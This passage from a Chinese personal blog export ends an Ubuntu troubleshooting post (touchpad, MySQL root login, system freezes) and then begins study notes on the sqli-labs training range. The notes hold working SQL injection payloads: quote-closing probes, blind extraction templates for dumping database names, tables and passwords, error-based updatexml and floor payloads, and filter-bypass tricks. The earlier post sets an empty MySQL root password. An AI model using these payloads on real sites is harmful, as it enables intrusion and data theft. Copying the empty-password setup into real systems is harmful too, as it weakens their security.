href="http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed4fece76310508c31490797634b87834e29938448e435061e5a24febc2222130ed2c4766d00bb0c01aaa639366c5c37b7ea99ce1983ac92597e&p=ce66d45d86cc42ae59a6c7710f5692&newp=882a9644d79f19fc57efd326470091231610db2151d7d4156b82c825d7331b001c3bbfb423261a07d3c1786007ad485eebf435733c0421a3dda5c91d9fb4c57479d47f&user=baidu&fm=sc&query=vim++ctal+c&qid=b8ec0cef0003ae1a&p1=5">当然可以挽救啦</a>：首选项，然后搜索vim，你会找到ctrl禁止的地方，lucky我也找到了vscode不能共有系统剪切板的原因，就在禁止ctrl那个按钮下面</p><h2 id="find的时候-gvfs文件权限不足"><a href="#find的时候-gvfs文件权限不足" class="headerlink" title="find的时候 gvfs文件权限不足"></a>find的时候 gvfs文件权限不足</h2><p><a href="http://www.cnblogs.com/chenmingjun/p/10311983.html">http://www.cnblogs.com/chenmingjun/p/10311983.html</a></p><h2 id="开机提示应用检测异常"><a href="#开机提示应用检测异常" class="headerlink" title="开机提示应用检测异常"></a>开机提示应用检测异常</h2><p><a href="https://blog.csdn.net/smhbqc/article/details/43559947">https://blog.csdn.net/smhbqc/article/details/43559947</a></p><h2 id="触控板"><a href="#触控板" class="headerlink" title="触控板"></a>触控板</h2><p>貌似就是不能用，我尝试过 网上的普通方法<br><a href="https://sangams.com.np/fix-ubuntu-18-4-touchpad-not-working-properly/">甚至尝试过安装触控板的驱动</a>:</p><ol><li> sudo apt-get install xserver-xorg-input-synaptics</li><li> 发现报错xserver-xorg-input-synaptics : 依赖: xserver-xorg-core</li><li> 先安装依赖在安装这个</li><li> reboot<br>最后结果就是重启之后 键盘鼠标全部失灵，就卡在桌面那里了<br>解决方法：</li><li> esc进去grub界面，然后选择root promt命令行格式敲</li><li>重新安装:<br> 也就类似于把input全部重新安装一次</li><li> 不放心，然后记得刚刚好像有个core的字样，不管三七二十一apt-get install –reinstall xserver-xorg-core  回车  貌似命令没错</li><li> 去你妈的 reboot试试 ！</li><li> 成了！然后我再也不敢碰xorg相关命令了。。。。。</li></ol><p><strong>2019年05月16日11:09:26  再次尝试 成功</strong><br>就是F9  fn开锁之后 按下F9即可 好傻逼的问题….233333</p><h2 id="关机无效-显示protocol-error"><a href="#关机无效-显示protocol-error" class="headerlink" title="关机无效 显示protocol error"></a>关机无效 显示protocol error</h2><p><a href="https://github.com/systemd/systemd/issues/8155">官方文档</a>：无效，因为我的Ubuntu没有/etc/mkinitcpio.conf的问题<br><a href="https://askubuntu.com/questions/1029068/ubuntu-18-04-stuck-at-shutdown">我使用的方案</a>：怀疑是自动挂起功能的影响</p><blockquote><p>我的笔记本电脑上有同样的问题 经过一番观察，我发现它与节电模式有关，特别是自动暂停。<br>转到Settings &gt; Power然后关闭所有Automatic Suspend选项。也可选择Blank screen到Never。<br>直到Ubuntu团队将弄清楚为什么挂起模式干扰关机过程，这解决了我的问题。</p></blockquote><h2 id="php下使用mysql-connect连接mysql出错（在Ubuntu18-04的环境下）"><a href="#php下使用mysql-connect连接mysql出错（在Ubuntu18-04的环境下）" class="headerlink" title="php下使用mysql_connect连接mysql出错（在Ubuntu18.04的环境下）"></a>php下使用mysql_connect连接mysql出错（在Ubuntu18.04的环境下）</h2><ol><li><p> 首先出错<code>Call to undefined function mysql_connect()</code></p><blockquote><p>百度说要我改php.ini配置文件，或者安装php5.0-mysql<br>操作：</p><blockquote><p>①php.ini里面没有找到对应的文字，也就无法更改<br>②我Ubuntu自带7.2版本，他是7.0应该不合适，在apt search发现 我已经安装了Php7.2-mysql 且未发现5.0的版本，此方法肯定过时<br>后面继续<a href="https://blog.csdn.net/zzf1510711060/article/details/82631254">百度</a>：从PHP5.0开始mysql_connect()就不推荐使用了，到PHP7.0就直接被废弃了，如果PHP为7.0及以上版本的话用mysqli_connect()代替即可。</p></blockquote></blockquote></li><li><p>使用mysqli_connect()出错：<code>(HY000/1045): Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES</code>[方案]（<a href="http://www.cnblogs.com/leolztang/p/5094930.html%EF%BC%89">http://www.cnblogs.com/leolztang/p/5094930.html）</a></p><blockquote><p>首先<code>：select user, plugin from mysql.user;</code>发现root|auth_socket 。百度说要改掉auth_socket，代码如下</p><blockquote><p>update mysql.user set authentication_string=PASSWORD(‘newPwd’), plugin=’mysql_native_password’ where user=’root’;<br>成功修改，但是注意一个问题：他给你的代码设置的密码为newPwd！！！！你得改改！</p></blockquote></blockquote></li><li><p>进行上一步之后，在当前命令行输入其他命令，会出现下面的错误</p><blockquote><p>mysql&gt; select user, plugin from mysql.user;</p><blockquote><p>ERROR 2006 (HY000): MySQL server has gone away<br>No connection. Trying to reconnect…<br>ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: NO)<br>ERROR: </p></blockquote></blockquote></li><li><p> 退出当前命令行再重新登录，发现了新的错误：ERROR 1045 (28000): Access denied for user ‘root’@’localhost’ (using password: YES)</p><blockquote><p>因为修改了默认密码，此时用新密码登录即可</p><blockquote><p>我尝试过很多格式 sudo mysql -u root -p newPwn (-p ‘newPwd’  -password newPwd 都还是出现上面的错误)<br>最后发现只有一种格式才能登录进去：sudo mysql -u root –password=newPwd</p></blockquote></blockquote></li></ol><p>之所以怀疑是因为命令行格式的原因，因为此时使用php脚本<code>$con=mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;newPwd&#39;);</code>可以链接成功，但是命令行却不想<br>5.  赶紧修改密码<br><code>用之前第二步的updata然后把newPwd更改 貌似无效</code></p><blockquote><p>由于考虑到每次都是要sudo mysql -u root –password=newPwd,我就想把密码置空，sudo mysql的格式即可</p><blockquote><p>set password for root@localhost = password(‘’);<br>此时php文件写成<code>$con=mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;&#39;);</code>即可连接成功</p></blockquote></blockquote><h2 id="死机"><a href="#死机" class="headerlink" title="死机"></a>死机</h2><ol><li><p><code>echo 0 &gt; /proc/sys/kernel/hung_task_timeout_secs&quot; disables this message.  </code> </p><blockquote><p>修改/etc/sysctl.conf文件<br><a href="https://www.cnblogs.com/wshenjin/p/7093505.html">https://www.cnblogs.com/wshenjin/p/7093505.html</a><br><a href="https://blog.csdn.net/yanggd1987/article/details/42388421">https://blog.csdn.net/yanggd1987/article/details/42388421</a></p></blockquote></li><li><p><code> ubuntu org.gnome.Shell.desktop[2461]: Window manager warning: Trying to re-add keybinding &quot;app-hotkey-1&quot;.</code></p><blockquote><p><del>sudo apt-get remove gnome-shell-extension-ubuntu-dock</del>影响到dash正常使用，而且还是依然死机 没有改变<br> <a href="https://github.com/micheleg/dash-to-dock/issues/641">https://github.com/micheleg/dash-to-dock/issues/641</a><br> <a href="https://github.com/micheleg/dash-to-dock/issues/643">https://github.com/micheleg/dash-to-dock/issues/643</a></p></blockquote></li><li><p><code>ubuntu /usr/lib/gdm3/gdm-x-session[1982]: open file /usr/share/fcitx-sogoupinyin/SogouInput/sgim_tip.bin failed.</code></p><blockquote><p><a href="https://askubuntu.com/questions/1143009/gnome-crashed-and-return-to-login-interface">https://askubuntu.com/questions/1143009/gnome-crashed-and-return-to-login-interface</a> 类似问题，但是没有解决</p></blockquote></li><li><p> 从显卡入手 390换成430（默认推荐430） <a href="https://www.jianshu.com/p/4366ed27add9">传送门</a>，因为<code>sudo ubuntu-drivers autoinstall</code>之后就是默认勾选430了</p></li><li><p>从swap入手，默认2G，因为内存8G就升级为8G</p><ol><li> <a href="https://my.oschina.net/icebergxty/blog/1858336">传送门</a> ：设置文件大小时候2048改成8192</li></ol></li><li><p>上面的都不行，最后还是换了内核</p><ol><li><a href="https://forum.ubuntu.org.cn/viewtopic.php?f=187&t=488711">传送门</a><blockquote><p>部分Intel顯示晶片的Ubuntu 18.04用戶可能會遭遇一種情況，畫面不定時地「凍結→崩潰→復原」，原因或許在於4.15.0核心對部份Intel顯示晶片的支援有問題，雖然至今（2018.12.24）這個臭蟲仍然未被修正，但是使用4.18.0-13核心可以避開上述問題：</p></blockquote></li><li> 按照这个切换的内核：<a href="https://zhengdao.github.io/2018/10/09/switch-ubuntu-linux-kernel/">传送门</a></li><li>上述会报错，因为GRUB_DEFAULT后面跟的内容过时了，换成<code>GRUB_DEFAULT=&#39;gnulinux-advanced-afef35de-622a-4ee5-80b0-c23e1e664072&gt;gnulinux-4.18.0-13-generic-advanced-afef35de-622a-4ee5-80b0-c23e1e664072&#39;</code>即可（仅对我的0-13有效）<blockquote><p>Please don’t use old title <code>Ubuntu，Linux 4.18.0-13-generic&#39; for GRUB_DEFAULT, use </code>Advanced options for Ubuntu&gt;Ubuntu，Linux 4.18.0-13-generic’ (for versions before 2.00) or `gnulinux-advanced-afef35de-622a-4ee5-80b0-c23e1e664072&gt;gnulinux-4.18.0-13-generic-advanced-afef35de-622a-4ee5-80b0-c23e1e664072’ (for 2.00 or later)<br><del>貌似大结局了 6就帮我搞定了233333</del></p></blockquote></li></ol></li><li><p>6的方法一直没错是因为再用chrome一直（因为Firefox下面的hackbar收费），最近xss需要用Firefox，然后又是日常死机，于是基本定位了问题了！</p><ol><li> 采取官网安装<a href="https://www.jianshu.com/p/c85ede46351d">传送门</a>的方式先试一试！</li><li> 同时怀疑是插件原因，先不安装插件使用一段时间！    </li></ol></li><li><p> 修改了系统版本之后貌似还是出现了死机的问题，因为之前一直在sql后面转xss，由于chrome不支持，所以就用firefox，然后就死机，综上觉得就是firefox的问题，但是由于要实习，就换为了win,问题搁置</p></li></ol><hr><h1 id="ENDING"><a href="#ENDING" class="headerlink" title="ENDING"></a>ENDING</h1><p>2019-6-30 09:30:21<br>因为7.1号要就职了，考虑到公司上班这玩意那玩意基本都是win上面的，就暂停了我的ubuntu之旅了。<br>最可惜的就是firefox和死机的问题只是处于怀疑阶段，没有得到实际的确定和解决</p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs靶场通关记录</title>
    <link href="/2019/06/18/%5Bold%5Dsqli-labs%E9%9D%B6%E5%9C%BA-%E6%8A%80%E8%83%BD%E7%82%B9%E8%A1%A5%E5%85%85/"/>
    <url>/2019/06/18/%5Bold%5Dsqli-labs%E9%9D%B6%E5%9C%BA-%E6%8A%80%E8%83%BD%E7%82%B9%E8%A1%A5%E5%85%85/</url>
    
    <content type="html"><![CDATA[<h1 id="意外所得"><a href="#意外所得" class="headerlink" title="意外所得"></a>意外所得</h1><ul><li><p> 打算用exp作报错注入，然后发现了一个trick：select exp（@@version）等效于select exp(5.7)进而根据返回的值来逆推可以知道版本号<br>  作用甚微，毕竟都可以直接返回结果了，还需要绕一圈干啥，但是好歹自己发现的23333</p></li><li><p> 当在from后面输入一个不存在的数据库时，会报出当前数据库名称,进而可以考虑爆列名<br>select * from xxx;<br>ERROR 1146 (42S02): Table ‘security.xxx’ doesn’t exist</p></li><li><p>   select sleep(find_in_set(mid(@@version,1,1),’0,1,2,3,4,5,6,7,8,9,.’));</p><blockquote><p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中,这种用法是不可<br>取的,因为时间会有网速等其他因素的影响,所以会影响结果的判断。<br>同时我这里sleep 6秒原因是因为从0开始数，5刚刚好是第六位</p></blockquote></li><li><p>select * from table_name where username=”*/<em>’ and password=’</em>/ xxxx”</p><ul><li> /**/前后两个构成一个闭环，注释掉中间password的内容，则可以通过这种方式实现一定程度的bypass比如<a href="https://www.anquanke.com/post/id/179216#h3-18">iscc2019-web5</a></li><li>  适用情况：过滤掉了注释符号#和–+</li><li>  /<em>后面的</em>/必须闭合，必须，不然一定报错！为什么一定报错？问题超纲了</li><li>  sqli lab11的骚操作<code>passwd=*/or+&#39;1&amp;uname=1&#39;/*</code>===&gt;数据库的log显示<code>SELECT username, password FROM users WHERE username=&#39;1&#39; /* &#39; and password=&#39;*/or &#39;1&#39; LIMIT 0,1</code>即注入成功，但是这里没有过滤掉–+和#，所以对于less11而言这种操作可以有，但是没必要。作为验证性的还是挺好的</li></ul></li><li><p>  堆叠注入</p><blockquote><p>在select 等被BAN的情况下 使用show tables ,show xxx from xxx的作用<a href="https://www.zhaoj.in/read-5873.html">https://www.zhaoj.in/read-5873.html</a></p></blockquote></li><li><p>   写Python脚本时候url里面不要直接#，要%23，不然老报错 </p></li><li><p>   order by </p><blockquote><p>select * from users where username=’admin’union select 1,2,’admin’order by 3,2;</p><blockquote><p>order by 3中的3表示第三列，即按照第三列排序<br>order by 3，2即先按照第三列拍，再按照第二列排序<br>我们在猜解第三列，还要order by 2干嘛？因为如果第三列刚刚好猜到密码为admin，此时排列的结果，可能是猜解的这一列在上，也可能是原表的admin这一列在上，具体排序结果不可控，从而导致盲注结果输出的不可知，进而无法判断出是否得到正确结果。因此增加一个第二列，因为第二列我们可预知，当第三列相同的时候，保证猜解的这一列在上！</p></blockquote></blockquote></li><li><p>  可以仔细分析返回的文件，也许会有细微的差别，而这个差别可能就对应注入的成功与否的标志<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190602005536.png" alt="20190602005536.png"></p></li><li><p>/<em>!数字 代码</em>/存在的意义？比如/<em>!40101 select</em>/的意义？</p><ul><li>   /*!40101 SET NAMES gbk */;  代表的是  如果mysql 版本大于4.0.1.01  ，就执行后面的 set names gbk 这句代码。这就有一个好处，这样就可以把mysql 特有的功能用这种注释，给注释掉，对于非mysql数据库可以正常运行，不需要修改，而对于mysql 数据库，就可以利用这些特性。</li></ul></li><li><p>在测试空格绕过的时候发现了两点</p><ul><li>  存在半角和全角空格是不同的，全角因为编码问题可以绕过preg_math的空格机制</li><li>chr(194).chr(160) 在php编码之后也可以变成空格，从而达到绕过<a href="https://www.cnblogs.com/zqifa/p/php-10.html?utm_source=itdadao&utm_medium=referral">传送门</a><br>对应的<a href="https://stackoverflow.com/questions/42424555/trim-whitespace-ascii-character-194-from-string">原理</a>：大概意思就是全角的空格被当做&amp;nbsp这类实体空格符的编码方式<br>  但是不幸运的是全角的空格，在数据库中当做半角空格这样的间隔符使用会报错，即使我修改了数据库编码全为UTF-8格式。<br>  至于chr(194)这种格式，无法通过get参数传递进去。毕竟传递进去就是一个纯字符串的形式，无法解析字符串里面的函数chr进而实现空格的逃逸</li></ul></li><li><p>PDO为什么能防止sql注入？<br>  因为他会提前预处理：将sql语句提前在sql当中准备，等你填入id,然后直接把Id传给sql去执行，这个时候传递的id的值，将默认为字符串，从而导致不了闭合，因此就防止了（前提是你必须禁止本地客户端模拟sql，不然依然导致注入。当然宽字节注入可以通杀）</p></li><li><p>为什么16进制可以编码绕过？</p><ul><li>  在我的mysql cli里面，hex编码并不行，整个语句不行，单独的列名也不行</li><li>  在我各种姿势百度之后搜到了以下，仅仅供参考</li><li>  ①官方文档的解释</li></ul></li><li><p>sql新思路<code>select case when xxx  then sleep(2) else 0 end</code></p><ul><li>  强网<a href="https://www.anquanke.com/post/id/179598">传送门</a><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2></li></ul></li><li><p>基于服务器接收到的响应</p><ul><li>  报错</li><li>  联合查询</li><li>  堆查询</li><li>盲注<ul><li>  布尔</li><li>  时间</li><li>  报错</li></ul></li></ul></li><li><p>基于如何处理输入的sql查询（数据类型）</p><ul><li>  字符串：<code>where name=xxx</code>（更常见）</li><li>  整形注入：<code>where id=xxx</code></li></ul></li><li><p>基于程度和顺序的注入（哪里发生了影响）</p><ul><li>  一阶注入:输入的注入语句直接对web产生影响，显示了结果</li><li>  二阶注入：类似存储性xss,是指输入的注入语句，无法直接对web应用程序产生影响，需要其他手段辅助来间接对web产生危害</li></ul></li><li><p>基于注入点位置</p><ul><li>  表单：get/post</li><li>  cookie</li><li>  header</li></ul></li></ul><h2 id="几个系统函数"><a href="#几个系统函数" class="headerlink" title="几个系统函数"></a>几个系统函数</h2><p>函数 | 作用 | 替代写法<br>| — |— |—|<br>version()|数据库版本|@@version<br>user()|数据库用户名|<br>database()|数据库名|<br>@@datadir|数据库路径|<br>@@version_compile_os|操作系统版本|<br>@@hostname|主机名|</p><blockquote><p>select后面可以直接跟这些函数，而不跟from xxx的格式（mysql支持这种，但是oracle不自持）<br>或者select xxx from dual格式也可以（通杀mysql oracle）</p></blockquote><h2 id="字符串链接函数"><a href="#字符串链接函数" class="headerlink" title="字符串链接函数"></a>字符串链接函数</h2><table><thead><tr><th>函数</th><th>介绍</th></tr></thead><tbody><tr><td>concat(str1,str2,…)</td><td>没有分隔符的连接字符串</td></tr><tr><td>concat_ws（separator,str1,str2,…）</td><td>以分隔符来连接字符串</td></tr><tr><td>group_concat(str1,str2,…)</td><td>连接参数产生的字符串。</td></tr></tbody></table><blockquote><p>这个三个函数都会出现这种情况:如果有一个参数为Null,则返回值为null<br>三个函数的用处是用于提高查询效率</p><blockquote><p>group_concat：突破limit的显示，直接把所有的行，集合在一起输出<br>如<code>http://sql.com/Less-1/?id=0&#39; union select 1,2,group_concat(username) from users--+</code>输出的结果是<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612175159.png" alt="20190612175159.png"><br>再比如<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612175645.png" alt="20190612175645.png"><br>可以看出，里面可以直接跟字段名，但是不能加上引号，不然当做常量，而非关键字/字段名<br>如果跟字段名的话，和order by组合并没有效果..</p></blockquote></blockquote><h2 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h2><ul><li>  –+（get表单中的填写方式）</li><li>  –%20（post表单中的填写方式）</li><li>  %23（get表单中的填写方式）</li><li>  #（post表单中的填写方式）</li><li>  – corporal 用来宣誓主权的写法<h2 id="常用试探语句"><a href="#常用试探语句" class="headerlink" title="常用试探语句"></a>常用试探语句</h2><table><thead><tr><th>语句</th><th>用途</th></tr></thead><tbody><tr><td>or 1=1–+</td><td></td></tr><tr><td>‘or 1=1–+</td><td>单引号</td></tr><tr><td>“or 1=1–+</td><td>双引号</td></tr><tr><td>)or 1=1–+</td><td>括号</td></tr><tr><td>‘)or 1=1–+</td><td>单引号+括号</td></tr><tr><td>“) or 1=1–+</td><td>双引号+括号</td></tr><tr><td>“))or 1=1–+</td><td>双引号+双括号</td></tr></tbody></table></li></ul><blockquote><p>and (select count(*) from mysql.user)&gt;0 来判断用户是否有权限dump into file</p><blockquote><p>天书里面写的！<a href="https://www.cnblogs.com/lcamry/p/5763111.html">传送门</a></p></blockquote></blockquote><h2 id="抽取数据的流程"><a href="#抽取数据的流程" class="headerlink" title="抽取数据的流程"></a>抽取数据的流程</h2><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190529161335.png" alt="20190529161335.png"></p><blockquote><p>查库&gt;&gt;&gt;&gt;查表&gt;&gt;&gt;查列&gt;&gt;&gt;&gt;查内容 </p></blockquote><h3 id="正向查找之information-schema"><a href="#正向查找之information-schema" class="headerlink" title="正向查找之information_schema"></a>正向查找之information_schema</h3><p>目的|操作<br>|—|—|<br>猜数据库|select schema_name from information_schema.schemata<br>猜某库的数据表|select table_name from information_schema.tables where table_schema=’xxxxx’<br>猜某表的所有列|Select column_name from information_schema.columns where table_name=’xxxxx’<br>获取某列的内容|Select xxxx from xxxx</p><blockquote><p>引号别掉了<br>可以用limit来指定指定行的输出，但是速度太慢，可以考虑结果前面的group_concat的语法！</p></blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190529161244.png" alt="20190529161244.png"></p><h3 id="逆向思维之爆破"><a href="#逆向思维之爆破" class="headerlink" title="逆向思维之爆破"></a>逆向思维之爆破</h3><blockquote><p>mysql运行的实例部署的时候，用普通用户运行的时候，则你无权访问information_schema库<br>这个时候你就不能按照刚刚的思路正向查找</p></blockquote><p>目的|操作<br>|—|—|<br>猜列名|select * from users where id=1 and <strong>password</strong> is not null<br>猜表名|select * from users where id=1 and <strong>users</strong>.password is not null;<br>猜库名|select * from users where id=1 and <strong>security</strong>.users.password is not null;<br>猜库里其他的表名| select * from users where id=1 and (select count(<em>) from <strong>emails</strong>)&gt;0;<br>猜该表和列对应关系|select * from users where id=1 and (select count(</em>) from emails where <strong>id</strong> is not null)&gt;0;<br>猜表里面列的内容| select * from users where id=1 and (select ord(mid((select email_id from emails where email_id is not null limit 0,1),<strong>1</strong>,1)))=<strong>68</strong>;<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190529161141.png" alt="20190529161141.png"></p><blockquote><p>其他库就猜不来了，毕竟mysql_connect的时候会指定数据库</p></blockquote><h3 id="其他数据库操作"><a href="#其他数据库操作" class="headerlink" title="其他数据库操作"></a>其他数据库操作</h3><p>group by：后面可以接合其它函数来达到报错注入效果<br>order by N：猜解列数<br>union :联合查询（union all：不去重的查询）</p><p>limit n：检索前五行<br>limit n,m：从第n行开始，检索m行（n从0开始）<br>limit n offest m：从第M行开始，检索n行（m从0开始）<br>（<strong>和上面的区别在于下面的可以绕过对逗号的过滤</strong>）</p><h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611220719.png" alt="20190611220719.png"><br>前面都是where 这里的闭合技巧<br>而where 后面可以跟上group by ，order by ，limit等都会成为注入的点，具体见下文</p><hr><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注即不直接显示出输出结果</p><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p><strong>字符串处理函数</strong><br>|函数|介绍|<br>|—|—|<br>substring_index（str,x,n）|以str中的X为分隔符，将str分为若干段，返回第n段内容<br>mid（str,x,l）|返回以字符串以X为起点，长度为L的子串<br>left(str,n)|从字符串左边截取前n位</p><p><strong>字符处理函数</strong><br>|函数|介绍|<br>|—|—|<br>ord()|返回字符串的首个字符的 ASCII 值<br>ascii()|返回字符串str的最左面字符的ASCII代码值。<br>char()|以字符的形式呈现出来</p><blockquote><p>是char 而非chr，chr会报错，因为mysql是char,oracle才是chr。我输入chr作为函数的的原因是php中chr（）函数的作用是以字符的形式呈现出来，而mysql里面没有chr函数</p></blockquote><h2 id="模糊匹配字符"><a href="#模糊匹配字符" class="headerlink" title="模糊匹配字符"></a>模糊匹配字符</h2><blockquote><p>部分参考freebuf的010师傅<a href="https://www.freebuf.com/news/139288.html">传送门</a></p></blockquote><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><ul><li>   <code>select * from users where id=1 and 1=(if((user() regexp &#39;^r&#39;),1,0));</code></li><li>   <code>select * from users where id=1 and 1=(user() regexp &#39;^ro&#39;);</code></li><li>   <code>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1);</code></li></ul><blockquote><p>不要止步于匹配成功，毕竟regexp ‘user’匹配到user和user_password都是成功，但是user不一定是正确结果，却会让你终止匹配</p></blockquote><h3 id="like匹配"><a href="#like匹配" class="headerlink" title="like匹配"></a>like匹配</h3><ul><li>   <code>select * from users where id=1 and 1=(user() like &#39;ro%&#39;);</code><blockquote><p>只有%和_，没有^和$。这里不是php里面的正则写法！<br>只能是’’，而非‘’。注意中英文的引号区别</p></blockquote><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612195425.png" alt="20190612195425.png"><br>而且可以不需要等号 不需要空格 毕竟两边都是括号！<strong>不需要空格间隔</strong>！！！<h3 id="between-and"><a href="#between-and" class="headerlink" title="between and"></a>between and</h3>c  beween a and b满足a≤c＜b的关系<br>因为一边是小于等于，一边是小于，所以可以基于 chr(x) chr(x+1)的形式来匹配字符<br>当匹配到第一个字符的时候 j的时候，在进行下一个字符比较，可以达到爆破的效果<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612201436.png" alt="20190612201436.png"><br>因为两边都是单引号包围的，则可以通过十六进制的形式来绕过，<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612201910.png" alt="20190612201910.png"><br>当然可以通过括号的形式，来绕过对空格的过滤。<br>但是因为and都可以使用了，其他的爆破方式基本应该可以使用，就显得比较鸡肋，但是我相信总有一天他会有用的！！！！<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3>没想到吧！其实我也没想到！<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612202628.png" alt="20190612202628.png"><br>感觉也比较鸡肋，比较都可以联合查询了！<br>但是如果所有函数都禁止使用了呢，regexp,in,like，and也被过滤了呢，是金子总会发光！<h3 id="大于小于等于号"><a href="#大于小于等于号" class="headerlink" title="大于小于等于号"></a>大于小于等于号</h3>当你意识到between and的时候，就应该意识到大于小于的问题了<br>但是必须搭配and<br>不搭配and无法准确爆破，只能如下图一样得到最大，最小两端的两个极值<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190612203542.png" alt="20190612203542.png"><h2 id="盲注方法"><a href="#盲注方法" class="headerlink" title="盲注方法"></a>盲注方法</h2>报错注入&gt;bool直接盲注&gt;bool构造报错盲注&gt;bool构造时间盲注<h3 id="报错之构造payload让信息通过错误提示回显出来"><a href="#报错之构造payload让信息通过错误提示回显出来" class="headerlink" title="报错之构造payload让信息通过错误提示回显出来"></a>报错之构造payload让信息通过错误提示回显出来</h3></li></ul><table><thead><tr><th>函数</th><th>作用</th><th>利用</th><th>环境</th></tr></thead><tbody><tr><td>updatexml</td><td>第二个参数</td><td>updatexml(1,(concat(0x7c,(select @@version))),1);</td><td>5.7.26</td></tr><tr><td>extractvalue</td><td>第二个参数</td><td>select extractvalue(1,concat(0x7c,(select user())));</td><td>5.7.26</td></tr><tr><td>floor</td><td>主键的唯一性</td><td>select * from (select count(*), concat(floor(rand(0)*2),(select user())) a from information_schema.tables group by a)b;</td><td>5.7.26</td></tr><tr><td>exp</td><td>范围&gt;709报错</td><td>select exp(710)</td><td><a href="https://xz.aliyun.com/t/253">≤5.5.47</a></td></tr><tr><td>还有几个基于几何参数类型不匹配的六大天王，<a href="https://corp0ra1.github.io/2019/05/22/%E6%B3%A8%E5%85%A5%E5%86%8D%E6%8E%A2/#%E4%B8%83%E4%B8%AA%E8%91%AB%E8%8A%A6%E5%A8%83">传送门</a></td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>很多开发人员禁止了回显错误,所以这个时候在这之上开发bool盲注<br>同时报错信息是有长度限制的，在mysql/my_error.c中可以看到：<br><code>/* Max length of a error message. Should be kept in sync with MYSQL_ERRMSG_SIZE. */</code><br><code>#define ERRMSGSIZE (512)</code></p></blockquote><p><strong>BTW</strong><br>个人<code> 5.7.26-0ubuntu0.18.04.1</code>利用less5测试之后，发现基于XPath注入仍然适用，floor注入不稳定，并不能一次命中（尝试10次6次失败）</p><blockquote><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/Peek 2019-05-31 19-19.gif"/>而基于exp()以及几何六巨头的报错已经宣告死亡（当然只是不能爆出有效信息，可以尝试接合bool报错倒是可以的）**补充**关于floor，如果information表被禁用了，同时关键表名被过滤或者不知道表名</blockquote><ul><li>   select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2));<br>核心还是在于主键的唯一性，利用union构造出一个100的表，同时后面再跟这union几个都没问题，但是这个别人测试的说明这个构造比较好，如果!被禁用，则可以是其他数字1或者0，自行发挥，自行测试</li><li>如果rand被禁用了则可以用用户变量代替<br>select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2);<blockquote><p>什么是@？用法？<br>  mysql中变量不用事前申明，在用的时候直接用“@变量名”使用就可以了。<br>  使用set时可以用“=”或“：=”，但是使用select时必须用“：=赋值”<br>  也就是a的值0101不断变化，从而达到rand的效果</p></blockquote></li></ul><p><strong>5.7.26测试成功</strong><br><strong>加餐</strong>：基于列名重复的报错<br><code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190601085902.png" alt="20190601085902.png"><br>然而这个报错注入很鸡肋,没有多大用,尝试了一下只用version()函数可以使用,其他可能因为不是常量的原因.</p><h3 id="布尔之直接构造逻辑判断-爆破"><a href="#布尔之直接构造逻辑判断-爆破" class="headerlink" title="布尔之直接构造逻辑判断+爆破"></a>布尔之直接构造逻辑判断+爆破</h3><p>根据上面的函数，来构造注入参数，从而形成判断，进而得出结果<br>基于Less-5</p><blockquote><p>不仅限于ord，还有ascii,char等<br>不仅限于此类爆破注入，还有基于正则的方法</p></blockquote><table><thead><tr><th>用途</th><th>函数</th><th>补充</th></tr></thead><tbody><tr><td>爆所有库名</td><td>?id=1’ and ord(mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=%d %%23</td><td>是shemata，不是其他 别自作聪明</td></tr><tr><td>爆当前库名</td><td>id=1’ and ord(mid((select database()),%d,1))=%d %23</td><td></td></tr><tr><td>爆库里所有表</td><td>?id=1’ and ord(mid((select table_name from information_schema.tables where table_schema=’security’ limit %d,1),%d,1))=%d %%23</td><td></td></tr><tr><td>爆列</td><td>Select column_name from information_schema.columns where table_name=’users’;</td><td>如果是用户当前使用的表的话，会多三列（见下图的红框框）</td></tr><tr><td>爆内容</td><td>?id=1’ and ord(mid((select password from users limit %d,1),%d,1))=%d %%23</td><td>可以后面加上where爆指定列</td></tr><tr><td><img 